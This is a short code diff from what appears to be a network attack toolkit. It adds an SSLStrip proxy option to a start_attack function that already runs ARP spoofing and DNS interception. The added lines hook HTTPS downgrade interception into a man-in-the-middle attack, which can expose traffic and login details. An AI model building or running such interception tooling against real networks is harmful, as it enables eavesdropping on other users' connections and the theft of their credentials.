@@ -5,6 +5,7 @@ from DNS import *
 import threading
 from config import config
 from discovery import ip_mac_cache
+from SSLStrip import start_proxy
 
 # Forges an ICMP echo request, used for Solaris systems
 # Creates an ARP entry for the [src_ip] on the destination device
@@ -188,6 +189,8 @@ def start_attack(group1, group2, self_ip, self_mac, interface):
 	if not config.arp.dos_enabled and config.dns.enabled:
 		drop_port_53()
 		intercept_pkts(self_mac, interface, only_dns_request, print_fn)
+	elif not config.arp.dos_enabled and config.ssl.enabled:
+		start_proxy()
 	else:
 		input("\nPress Enter to stop the attack...\n")
 
